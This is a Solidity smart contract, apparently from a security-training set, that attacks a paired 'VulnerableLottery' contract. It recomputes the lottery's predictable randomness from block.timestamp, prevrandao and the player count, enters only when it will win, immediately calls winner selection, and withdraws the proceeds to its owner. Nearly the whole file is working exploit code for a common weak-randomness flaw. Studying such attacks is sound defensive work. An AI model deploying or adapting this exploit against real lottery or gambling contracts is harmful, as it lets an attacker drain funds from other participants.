// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {VulnerableLottery} from "./VulnerableLottery.sol";

/// @title RandomnessAttacker
/// @notice Exploits predictable randomness in VulnerableLottery
/// @dev Demonstrates how attackers can predict and manipulate lottery outcomes
contract RandomnessAttacker {
    VulnerableLottery public lottery;
    address public owner;

    event AttackExecuted(address indexed winner, uint256 amount);
    event EntryDecision(bool willWin, address predictedWinner);

    error OnlyOwner();
    error WillNotWin();

    constructor(address payable _lottery) {
        lottery = VulnerableLottery(_lottery);
        owner = msg.sender;
    }

    /// @notice Check if we would win before entering
    /// @dev Calculates same randomness as lottery contract
    function wouldWin() public view returns (bool) {
        address[] memory players = lottery.getPlayers();
        uint256 playerCount = players.length + 1; // Including us

        // Calculate what the random number would be
        uint256 randomNumber = uint256(
            keccak256(
                abi.encodePacked(block.timestamp, block.prevrandao, playerCount)
            )
        );

        uint256 winnerIndex = randomNumber % playerCount;

        // We would be the last player
        return winnerIndex == (playerCount - 1);
    }

    /// @notice Attack: Only enter if we know we'll win
    /// @dev This is the exploit - attacker only enters when they'll win!
    function attackEnter() external payable {
        if (msg.sender != owner) revert OnlyOwner();

        // Check if we would win
        address predictedWinner = lottery.predictWinner();
        bool willWin = wouldWin();

        emit EntryDecision(willWin, predictedWinner);

        if (!willWin) revert WillNotWin();

        // Only enter if we'll win
        lottery.enter{value: msg.value}();
        lottery.selectWinner();
    }

    /// @notice Alternative attack: Brute force timing
    /// @dev Keep calling until we find a timestamp where we win
    /// In practice, attacker would wait for favorable block.timestamp
    function attackBruteForce() external payable {
        if (msg.sender != owner) revert OnlyOwner();

        // In real attack, would wait/time the transaction
        // to hit when block.timestamp gives us winning number
        lottery.enter{value: msg.value}();
    }

    /// @notice Withdraw winnings
    function withdraw() external {
        if (msg.sender != owner) revert OnlyOwner();

        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    /// @notice Get balance
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {
        emit AttackExecuted(address(this), msg.value);
    }
}
